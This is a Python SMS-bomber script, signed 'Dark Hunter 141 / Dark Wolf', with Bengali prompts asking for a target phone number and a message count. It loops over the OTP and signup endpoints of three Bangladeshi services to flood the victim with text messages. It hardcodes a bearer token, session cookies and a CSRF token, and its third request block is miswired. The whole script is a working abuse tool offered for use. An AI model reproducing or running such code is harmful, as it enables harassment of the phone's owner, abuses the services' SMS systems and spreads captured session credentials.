import time;
import sys;
import requests;


def bg(text):
    for i in text:
        sys.stdout.write(i);
        sys.stdout.flush();
        time.sleep(0.0009);

logo='''

  ____ _____ _   _          
 |  _ \_   _| \ | |   /\    
 | |_) || | |  \| |  /  \   
 |  _ < | | | . ` | / /\ \  
 | |_) || |_| |\  |/ ____ \ 
 |____/_____|_| \_/_/    \_\
                            
                            

    
'''
name='''
           Team   : Dark Hunter 141 
           Author : Dark Wolf                                            
'''
line = '' * 40 + '_' * 30 +''*40

bg(logo);
bg(line);
bg(name);
bg(line);
print("\n");
 

num= input(" Or Number ta daw: ")
sms=int(input("\:koto gula sms deba? : "));

c=0;

while True:
    url = "https://api.shikho.com/auth/v2/send/sms"
    payload = {
        "phone": f"{num}",
        "type": "Student",
        "auth_type": "signup",
        "Vendor": "shikho"
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36",
        "Origin": "https://app.shikho.com",
        "Referer": "https://app.shikho.com/"
    }

    response = requests.post(url, json=payload, headers=headers)
    if response.status_code ==200:
        c=c+1;
        print(f"{c}SMS Send complete !")
        if c==sms:
            break;
  
       
           
         
            
#2nd API
    url2 = f"https://web-api.binge.buzz/api/v3/otp/send/+88{num}"

    headers2 = {
        'Sec-Ch-Ua': 'Not=A?Brand";v="99", "Chromium";v="118"',
        'Accept': 'application/json, text/plain, /',
        'Device-Type': 'web',
        'Sec-Ch-Ua-Mobile': '?0',
        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJGcmVlIiwiY3JlYXRlZEF0IjoiY3JlYXRlIGRhdGUiLCJ1cGRhdGVkQXQiOiJ1cGRhdGUgZGF0ZSIsInR5cGUiOiJ0b2tlbiIsImRldlR5cGUiOiJ3ZWIiLCJleHRyYSI6IjMxNDE1OTI2IiwiaWF0IjoxNzAwNzUwNDUwLCJleHAiOjE3MDA5MjMyNTB9.pZ0nacqbNKT31u3crkeRp85kuXdqChbZbag8KTfogT8',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36',
        'Sec-Ch-Ua-Platform': 'Linux',
        'Origin': 'https://binge.buzz',
        'Sec-Fetch-Site': 'same-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://binge.buzz/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
        }
    response = requests.get(url2,   headers=headers2)
    if response.status_code ==200:
        c=c+1;
        print(f"{c}SMS Send complete !")
        if c==sms:
            break;
        
    import requests

    url3 = "https://daktarbhai.com/login/mobile"

    headers = {
        "Host": "daktarbhai.com",
        "Cookie": "XSRF-TOKEN=eyJpdiI6InBabUhZek5Qc1h0UlBvZXBwS1RDS0E9PSIsInZhbHVlIjoiYU5sYmVJbFAwYUUrY1wvdDBNclZaUXlWeXFpSFZXNHVTR0lIQjUxa2NNXC9BcURmNTU2OXFLaGZHMU1GKzdUR1VnIiwibWFjIjoiNmVhZjMxMWE3N2NlMWE0Yzk3YjE2OGY3ZWQwOGMzOGM1YjJkNTIyNTAyNjgyYTlkOTg0YjIzNmIyZmM1NWE5OCJ9; daktarbhai_web_session=eyJpdiI6InJsbHBRUEg3RTQ0XC94XC9sTFM1bkp5dz09IiwidmFsdWUiOiJiWjhEZElxOFNaK04wXC9KTnVXV2RSeXJ3UDNEMDRXZkhJaEJvOVRIR0twVUoxb1MyS3NJSE8ydE5HUnFKU2RDbyIsIm1hYyI6Ijg5YWUzZWIzNmMzODU0NDQ0YWIxMzQ0YTVjMGNjMmQ2YzcyNmE1MDY1YjFhZGRjYmJiMjUxOGY4NDRjMjlhYTcifQ%3D%3D; _ga_H0CWDNCVZL=GS1.1.1705324840.1.1.1705324874.26.0.0; _ga=GA1.2.1782987337.1705324840; _gid=GA1.2.14568045.1705324849",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://daktarbhai.com/signin",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Csrf-Token": "RbNyaZkMDEUcnPJEMtI7QemvP3rTtawM8dlesxXw",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://daktarbhai.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
        "Connection": "close",
    }

    data = {"mobile": f"{num}"}

    response = requests.post(url, headers=headers, data=data)

print(response.text)
